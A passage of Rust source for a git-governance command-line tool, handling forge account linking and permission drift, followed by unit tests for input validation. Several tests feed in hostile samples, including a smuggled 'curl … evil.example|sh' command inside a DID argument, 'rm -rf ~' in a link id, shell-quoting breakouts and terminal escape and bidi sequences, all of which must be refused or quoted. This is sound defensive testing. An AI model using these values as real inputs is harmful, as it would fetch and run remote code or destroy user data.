            let (did, key) = signing_key(keyring_key)?;
            let resp = anon()
                .git_ns_view_v2(resource.as_deref(), &key)
                .await
                .map_err(|e| explain(e, &did))?;
            show(&resp)
        }
        GitCommands::Link {
            forge,
            list,
            status,
            no_wait,
        } => {
            let (did, key) = signing_key(keyring_key)?;
            let client = anon();
            let json_mode = is_json_output();
            if list {
                let resp = client
                    .git_ns_view_v2(None, &key)
                    .await
                    .map_err(|e| explain(e, &did))?;
                let accounts = serde_json::to_value(&resp)?["accounts"].take();
                if json_mode {
                    return Ok(print_json(&json!({ "accounts": accounts }))?);
                }
                let lines = account_lines(&accounts);
                if lines.is_empty() {
                    println!(
                        "No forge account is linked to {}. Link one:\n  {} git link --forge <forge>",
                        terminal_safe(&did),
                        shell_word(bin_name())
                    );
                }
                for line in lines {
                    println!("{line}");
                }
                return Ok(());
            }
            let (link_id, deadline) = match (status, forge) {
                (Some(id), _) => (id, None),
                (None, Some(forge)) => {
                    let forge = forge.to_lowercase();
                    let v = serde_json::to_value(
                        client
                            .git_ns_link_account(&forge, &key)
                            .await
                            .map_err(|e| explain(e, &did))?,
                    )?;
                    // Refuse a URL this client will not show before anything
                    // is printed, JSON included.
                    let text = link_instructions(&forge, &v)?;
                    if no_wait && json_mode {
                        return Ok(print_json(&v)?);
                    }
                    // With JSON output, stdout carries only the final answer.
                    if json_mode {
                        eprintln!("{text}");
                    } else {
                        println!("{text}");
                    }
                    if no_wait {
                        return Ok(());
                    }
                    let deadline = v
                        .get("expiresAt")
                        .and_then(Value::as_str)
                        .and_then(|t| chrono::DateTime::parse_from_rfc3339(t).ok())
                        .map(|t| t.with_timezone(&chrono::Utc));
                    let link_id = v
                        .get("linkId")
                        .and_then(Value::as_str)
                        .unwrap_or_default()
                        .to_string();
                    (link_id, deadline)
                }
                (None, None) => return Err("name the forge to link: --forge <host>".into()),
            };
            let v = if no_wait {
                serde_json::to_value(
                    client
                        .git_ns_link_status(&link_id, &key)
                        .await
                        .map_err(|e| explain(e, &did))?,
                )?
            } else {
                eprintln!(
                    "{DIM}Waiting for the forge to confirm (Ctrl-C stops waiting; the link \
                     continues){RESET}"
                );
                follow_link(&client, &key, &did, &link_id, deadline).await?
            };
            finish_link(&mut std::io::stdout(), json_mode, &v, &did, &link_id)
        }
        GitCommands::Drift {
            command:
                DriftCommands::Resolve {
                    resource,
                    action,
                    kind,
                    account_id,
                    account_login,
                    observed,
                    reason,
                },
        } => {
            let (did, key) = signing_key(keyring_key)?;
            let payload = drift_payload(
                &resource,
                action,
                kind,
                account_id,
                account_login,
                observed,
                reason,
            )?;
            let payload: specs::drift::resolve::v0_1::Payload = serde_json::from_value(payload)
                .map_err(|e| format!("that resolution is not well formed: {e}"))?;
            let resp = anon()
                .git_ns_drift_resolve(&payload, &key)
                .await
                .map_err(|e| explain(e, &did))?;
            show(&resp)
        }
        GitCommands::Reseat {
            namespace,
            subject,
            statement,
        } => {
            let subject = did_arg("--subject", &subject)?;
            let (did, key) = signing_key(keyring_key)?;
            let resp = anon()
                .git_ns_reseat(&namespace, &subject, &statement, &key)
                .await
                .map_err(|e| explain(e, &did))?;
            show(&resp)
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn an_elevated_refusal_says_a_community_administrator_is_needed() {
        let g = guidance(
            "permissionDenied",
            "repo.transfer is a elevated action … (`[git_ns] elevated_requires_admin`)",
            "did:key:z",
        );
        assert!(g.contains("without a community administrator"), "{g}");
    }

    #[tokio::test]
    async fn the_bind_notice_is_written_before_the_request_is_sent() {
        use std::sync::atomic::{AtomicBool, Ordering};
        struct Probe<'a> {
            sent: &'a AtomicBool,
            text: Vec<u8>,
        }
        impl std::io::Write for Probe<'_> {
            fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
                assert!(
                    !self.sent.load(Ordering::SeqCst),
                    "the notice came after the request"
                );
                self.text.extend_from_slice(buf);
                Ok(buf.len())
            }
            fn flush(&mut self) -> std::io::Result<()> {
                Ok(())
            }
        }
        let sent = AtomicBool::new(false);
        let mut out = Probe {
            sent: &sent,
            text: Vec::new(),
        };
        announce_then(&mut out, &bind_notice("github.com", "acme"), async {
            sent.store(true, Ordering::SeqCst)
        })
        .await;
        assert!(sent.load(Ordering::SeqCst));
        let text = String::from_utf8(out.text).unwrap();
        assert!(text.contains("github.com/acme will be published"), "{text}");
    }

    #[test]
    fn a_last_owner_refusal_names_the_grant_that_resolves_it() {
        let g = guidance("git-ns:lastOwner", "last owner", "did:key:z");
        assert!(g.contains("--right git.repo.own"), "{g}");
    }

    #[test]
    fn drift_resolve_arguments_become_the_specifications_selector() {
        let p = drift_payload(
            "GitHub.com/Acme/Widgets",
            DriftAction::Revert,
            DriftTypeArg::RoleAdded,
            Some("5550123".into()),
            Some("eve-dev".into()),
            Some("write".into()),
            None,
        )
        .unwrap();
        assert_eq!(
            p,
            json!({
                "resource": "github.com/acme/widgets",
                "action": "revert",
                "drift": {
                    "type": "roleAdded",
                    "account": { "forge": "github.com", "id": "5550123", "login": "eve-dev" },
                    "observed": "write"
                }
            })
        );
        let _: specs::drift::resolve::v0_1::Payload = serde_json::from_value(p).unwrap();
        // A role item needs its account; a protection item has none; adopt
        // needs what was observed.
        assert!(
            drift_payload(
                "github.com/a/b",
                DriftAction::Revert,
                DriftTypeArg::RoleAdded,
                None,
                None,
                None,
                None
            )
            .is_err()
        );
        assert!(
            drift_payload(
                "github.com/a/b",
                DriftAction::Revert,
                DriftTypeArg::BootstrapMissing,
                Some("1".into()),
                None,
                None,
                None
            )
            .is_err()
        );
        assert!(
            drift_payload(
                "github.com/a/b",
                DriftAction::Adopt,
                DriftTypeArg::RoleChanged,
                Some("1".into()),
                None,
                None,
                None
            )
            .is_err()
        );
    }

    #[test]
    fn a_not_revertible_refusal_explains_the_bridge_version() {
        let g = guidance("git-ns/drift/resolve:notRevertible", "refused", "did:key:z");
        assert!(g.contains("bridge/job 0.1"), "{g}");
    }

    #[test]
    fn a_did_argument_that_is_not_did_core_is_refused_before_signing() {
        for bad in [
            "did:web:x.example$(curl${IFS}-s${IFS}evil.example|sh)",
            "did:web:x;id",
            "did:web:x y",
            "did:web:x#k-1",
        ] {
            assert!(did_arg("--subject", bad).is_err(), "{bad}");
        }
        assert!(did_arg("--subject", "did:webvh:QmScid:acme-vtc.example:bob").is_ok());
    }

    #[test]
    fn printed_commands_quote_what_a_shell_would_interpret() {
        assert_eq!(shell_word("cnm"), "cnm");
        assert_eq!(
            shell_word("did:webvh:QmScid:acme.example"),
            "did:webvh:QmScid:acme.example"
        );
        assert_eq!(shell_word("a b"), "'a b'");
        assert_eq!(shell_word("$(id)"), "'$(id)'");
        assert_eq!(shell_word("it's"), r#"'it'"'"'s'"#);
        assert_eq!(shell_word("'"), r#""'""#);
        assert_eq!(shell_word("\\"), r#""\\""#);
        assert_eq!(
            shell_word(FISH_BREAKOUT),
            r#"'x'"\\""'"' ; echo INJECTED ; echo '"\\""#
        );
        assert_eq!(shell_word(""), "''");
        assert_eq!(shell_word("-x"), "'-x'");
        assert_eq!(shell_word("=ls"), "'=ls'");
        assert_eq!(shell_word("%self"), "'%self'");
        assert_eq!(shell_word("a=b"), "a=b");
        // A refusal's text reaches the terminal without its control bytes.
        let g = guidance("git-ns:lastOwner", "evil\u{1b}[2Jmsg", "did:key:z\u{7}");
        assert!(!g.chars().any(|c| c.is_control() && c != '\n'), "{g:?}");
        // The code too: it is the VTC's text as much as the message is.
        let g = guidance("x\u{1b}]0;pwned\u{7}", "m", "did:key:z");
        assert!(!g.chars().any(|c| c.is_control() && c != '\n'), "{g:?}");
    }

    /// POSIX `'\''` quoting breaks out here in fish, which reads `\'` and
    /// `\\` as escapes inside single quotes.
    const FISH_BREAKOUT: &str = r"x\' ; echo INJECTED ; echo \";

    /// What `shell` makes of `words`, read back through an external printf.
    fn argv_in(shell: &str, words: &str) -> Option<Vec<String>> {
        let home = std::env::temp_dir().join("cnm-shell-word-test-home");
        std::fs::create_dir_all(&home).ok()?;
        let out = std::process::Command::new(shell)
            .arg("-c")
            .arg(format!(r"env printf '%s\0' {words}"))
            .env_clear()
            .env("PATH", std::env::var_os("PATH").unwrap_or_default())
            .env("HOME", &home)
            .stderr(std::process::Stdio::null())
            .output()
            .ok()?;
        assert!(out.status.success(), "{shell} failed on {words:?}");
        let text = String::from_utf8(out.stdout).expect("utf-8");
        let mut v: Vec<String> = text.split('\0').map(str::to_string).collect();
        v.pop();
        Some(v)
    }

    #[test]
    fn printed_words_round_trip_in_sh_bash_zsh_and_fish() {
        let hostile = [
            FISH_BREAKOUT,
            "it's",
            "'",
            r"\",
            r"\\",
            r"\'",
            r"'\",
            r"a\'b\\'c",
            "$(echo INJECTED)",
            "${HOME}",
            "$fish_pid",
            "`echo INJECTED`",
            "(echo INJECTED)",
            "line one\nline two\n",
            "emoji \u{1f980} and \u{fc}n\u{ef}c\u{f6}d\u{e9}",
            "-rf",
            "--help",
            "=ls",
            "%self",
            "~root",
            "*",
            "{a,b}",
            "a;b|c&d>e<f",
            "\"double\" quotes",
            "#hash",
            "",
            " ",
            "did:webvh:QmScid:acme.example",
        ];
        let words = hostile
            .iter()
            .map(|v| shell_word(v))
            .collect::<Vec<_>>()
            .join(" ");
        let mut ran = 0;
        for shell in ["sh", "bash", "zsh", "fish"] {
            // sh is everywhere; the others are checked where installed.
            let Some(argv) = argv_in(shell, &words) else {
                assert_ne!(shell, "sh", "sh must be runnable");
                continue;
            };
            assert_eq!(argv, hostile, "{shell}");
            ran += 1;
        }
        assert!(ran >= 1);
    }

    #[test]
    fn drift_refusals_name_the_remedy_that_applies() {
        let g = guidance(
            "git-ns/drift/resolve:notAdoptable",
            "`maintain` is no higher than what the member already holds",
            "did:key:z",
        );
        assert!(g.contains("git revoke"), "{g}");
        let g = guidance(
            "git-ns/drift/resolve:notAdoptable",
            "a `requiredCheckMissing` item records no right",
            "did:key:z",
        );
        assert!(g.contains("revert --type"), "{g}");
        let g = guidance(
            "git-ns/drift/resolve:notRevertible",
            "github.com/acme is governed in manual mode",
            "did:key:z",
        );
        assert!(g.contains("on the forge yourself"), "{g}");
        let g = guidance(
            "git-ns/drift/resolve:notRevertible",
            "that account belongs to a member the projection gives a role here",
            "did:key:z",
        );
        assert!(g.contains("git revoke"), "{g}");
    }

    #[test]
    fn link_instructions_show_the_code_and_how_to_follow_the_link() {
        let device = json!({
            "linkId": "lnk_4Tq9Xw2P",
            "url": "https://github.com/login/device",
            "userCode": "WDJB-MJHT",
            "expiresAt": "2026-09-23T10:15:00Z",
        });
        let t = link_instructions("github.com", &device).unwrap();
        assert!(t.contains("https://github.com/login/device"), "{t}");
        assert!(t.contains("WDJB-MJHT"), "{t}");
        assert!(t.contains("git link --status lnk_4Tq9Xw2P"), "{t}");
        // Forgejo has no device flow: a URL and no code.
        let pkce = json!({
            "linkId": "lnk_8Rm3Kd7Q",
            "url": "https://codeberg.org/login/oauth/authorize?client_id=acme-vgi&state=Zp4v",
            "expiresAt": "2026-09-23T10:15:00Z",
        });
        let t = link_instructions("codeberg.org", &pkce).unwrap();
        assert!(!t.contains("enter the code"), "{t}");
        // What the bridge returns reaches the terminal without control bytes,
        // and a link id that is not one shell word is quoted.
        let hostile = json!({
            "linkId": "lnk_1; rm -rf ~",
            "url": "https://x.example/\u{1b}]0;pwned\u{7}",
            "userCode": "AB\u{1b}[2J",
            "expiresAt": "2026-09-23T10:15:00Z",
        });
        let t = link_instructions("github.com", &hostile).unwrap();
        assert!(!t.contains('\u{7}') && !t.contains("\u{1b}]"), "{t:?}");
        assert!(t.contains("--status 'lnk_1; rm -rf ~'"), "{t}");
    }

    /// A bidi override or a zero-width character in what the bridge returned
    /// cannot make the printed URL read as another.
    #[test]
    fn bidi_and_zero_width_characters_never_reach_the_terminal() {
        for c in [
            '\u{202A}',
            '\u{202B}',
            '\u{202C}',
            '\u{202D}',
            '\u{202E}',
            '\u{2066}',
            '\u{2067}',
            '\u{2068}',
            '\u{2069}',
            '\u{200B}',
            '\u{200C}',
            '\u{200D}',
            '\u{200E}',
            '\u{200F}',
            '\u{FEFF}',
            '\u{00AD}',
            '\u{2060}',
            '\u{E0041}',
        ] {
            assert_eq!(
                terminal_safe(&format!("a{c}b")),
                "a?b",
                "U+{:04X}",
                u32::from(c)
            );
        }
        // Printable text is untouched, the non-ASCII included.
        assert_eq!(terminal_safe("ünïcödé \u{1f980}"), "ünïcödé \u{1f980}");
        let v = json!({
            "linkId": "lnk_\u{202E}x",
            "url": "https://github.com/login/device\u{202E}moc.live",
            "userCode": "WD\u{2066}JB",
            "expiresAt": "2026-09-23T10:15:00Z",
        });
        let t = link_instructions("github.com", &v).unwrap();
        assert!(
            !t.chars()
                .any(|c| is_format_char(c) || (c.is_control() && c != '\n' && c != '\x1b')),
            "{t:?}"
        );
        // In the URL they arrive percent-encoded, as the parsed URL writes them.
        assert!(
            t.contains("https://github.com/login/device%E2%80%AEmoc.live"),
            "{t}"
        );
        // And a refusal's text is held to the same rule.
        let g = guidance("git-ns:lastOwner", "evil\u{202E}txt", "did:key:z");
        assert!(!g.chars().any(is_format_char), "{g:?}");
    }

    #[test]
    fn an_authorisation_url_that_is_not_https_is_refused_before_printing() {
        for bad in [
            "http://github.com/login/device",
            "javascript:alert(1)",
            "file:///etc/passwd",
            "https://",
            "https://user:pass@github.com/login/device",
            "not a url",
            "",
        ] {
            let v = json!({ "linkId": "lnk_1", "url": bad, "expiresAt": "2026-09-23T10:15:00Z" });
            let e = link_instructions("github.com", &v).unwrap_err();
            assert!(e.contains("will not show"), "{bad}: {e}");
        }
        let v = json!({ "linkId": "lnk_1", "expiresAt": "2026-09-23T10:15:00Z" });
        assert!(link_instructions("github.com", &v).is_err());
        // A lookalike host is shown in its IDNA form, not as the glyphs.
        let v = json!({
            "linkId": "lnk_1",
            "url": "https://gіthub.com/login/device",
            "expiresAt": "2026-09-23T10:15:00Z",
        });
        let t = link_instructions("github.com", &v).unwrap();
        assert!(t.contains("https://xn--"), "{t}");
    }

    #[test]
    fn link_states_other_than_linked_are_errors_in_both_modes() {
        let did = "did:webvh:QmBobScid2:acme-vtc.example:bob";
        let linked = json!({
            "state": "linked",
            "account": { "forge": "github.com", "id": "9120045", "login": "bob-builds" },
        });
        for json_mode in [false, true] {
            let mut out = Vec::new();
            finish_link(&mut out, json_mode, &linked, did, "lnk_1").unwrap();
            let text = String::from_utf8(out).unwrap();
            if json_mode {
                // stdout is exactly the JSON document, nothing else.
                let back: Value = serde_json::from_str(&text).unwrap();
                assert_eq!(back, linked);
            } else {
                assert!(
                    text.contains("bob-builds") && text.contains("9120045"),
                    "{text}"
                );
            }
            for (state, hint) in [
                ("expired", "git link --forge"),
                ("failed", "git link --list"),
                ("pending", "git link --status lnk_1"),
                ("odd", "does not know"),
            ] {
                let v = json!({ "state": state });
                let mut out = Vec::new();
                let e = finish_link(&mut out, json_mode, &v, did, "lnk_1")
                    .unwrap_err()
                    .to_string();
                assert!(e.contains(hint), "{state}: {e}");
                let text = String::from_utf8(out).unwrap();
                if json_mode {
                    let back: Value = serde_json::from_str(&text)
                        .unwrap_or_else(|e| panic!("{state}: stdout is not JSON ({e}): {text}"));
                    assert_eq!(back, v);
                } else {
                    assert!(text.is_empty(), "{state}: {text}");
                }
            }
        }
    }

    #[test]
    fn a_failed_link_names_both_causes() {
        let LinkEnd::NotLinked(e) = link_end(&json!({ "state": "failed" }), "did:key:z", "l")
        else {
            panic!("failed is not linked");
        };
        assert!(e.contains("the forge refused it"), "{e}");
        assert!(e.contains("already linked to another member"), "{e}");
    }

    /// Answers `states` in turn (repeating the last), counting the asks, on a
    /// clock that advances one poll interval per sleep.
    async fn follow_states(
        states: &[&str],
        deadline: Option<chrono::DateTime<chrono::Utc>>,
        start: chrono::DateTime<chrono::Utc>,
    ) -> (Value, usize) {
        use std::cell::Cell;
        let asks = Cell::new(0usize);
        let clock = Cell::new(start);
        let v = follow(
            || {
                let i = asks.get();
                asks.set(i + 1);
                let state = states[i.min(states.len() - 1)];
                async move { Ok(json!({ "state": state })) }
            },
            deadline,
            || clock.get(),
            || {
                clock.set(clock.get() + chrono::Duration::seconds(5));
                async {}
            },
        )
        .await
        .unwrap();
        (v, asks.get())
    }

    #[tokio::test]
    async fn following_a_link_stops_at_a_final_state_or_past_the_deadline() {
        let t0 = chrono::DateTime::parse_from_rfc3339("2026-09-23T10:00:00Z")
            .unwrap()
            .with_timezone(&chrono::Utc);
        // A final state ends it at once.
        let (v, asks) = follow_states(&["pending", "pending", "linked"], None, t0).await;
        assert_eq!((v["state"].as_str(), asks), (Some("linked"), 3));
        let (v, asks) = follow_states(&["failed"], Some(t0), t0).await;
        assert_eq!((v["state"].as_str(), asks), (Some("failed"), 1));
        // Pending for ever: it stops once the deadline and the grace have
        // passed — 60 s of deadline plus 30 s of grace, at 5 s a poll: the
        // 20th ask, the first made at t0 + 95 s, is the last.
        let (v, asks) =
            follow_states(&["pending"], Some(t0 + chrono::Duration::seconds(60)), t0).await;
        assert_eq!(v["state"].as_str(), Some("pending"));
        assert_eq!(asks, 20);
        // A deadline already long past: one ask, then stop.
        let (_, asks) =
            follow_states(&["pending"], Some(t0 - chrono::Duration::hours(1)), t0).await;
        assert_eq!(asks, 1);
    }

    #[test]
    fn linked_accounts_are_listed_one_per_line() {
        let accounts = json!([
            {
                "account": { "forge": "github.com", "id": "9120045", "login": "bob-builds" },
                "linkedAt": "2026-09-23T10:02:14Z",
            },
            {
                "account": { "forge": "codeberg.org", "id": "311", "login": "bob" },
                "linkedAt": "2026-09-24T08:00:00Z",
            },
        ]);
        let lines = account_lines(&accounts);
        assert_eq!(lines.len(), 2);
        assert!(lines[0].contains("github.com") && lines[0].contains("bob-builds"));
        assert!(lines[1].contains("codeberg.org") && lines[1].contains("311"));
        assert!(account_lines(&json!([])).is_empty());
    }

    #[test]
    fn link_refusals_name_the_fix() {
        let g = guidance(
            "git-ns/account/link:unsupportedForge",
            "this VTC has no bridge-mode namespace on gitlab.com to complete a link",
            "did:key:z",
        );
        assert!(g.contains("git namespace list"), "{g}");
        let g = guidance(
            "permissionDenied",
            "linking a forge account is for members of this community",
            "did:key:z",
        );
        assert!(g.contains("not one here") && !g.contains("git view"), "{g}");
        let g = guidance(
            "git-ns/account/link-status:unknownLink",
            "no link",
            "did:key:z",
        );
        assert!(g.contains("git link --forge"), "{g}");
    }

    #[test]
    fn right_arguments_carry_the_wire_spelling() {
        assert_eq!(RightArg::CommitSign.as_str(), "git.commit.sign");
        assert_eq!(RightArg::NsAdmin.as_str(), "git.ns.admin");
    }
}
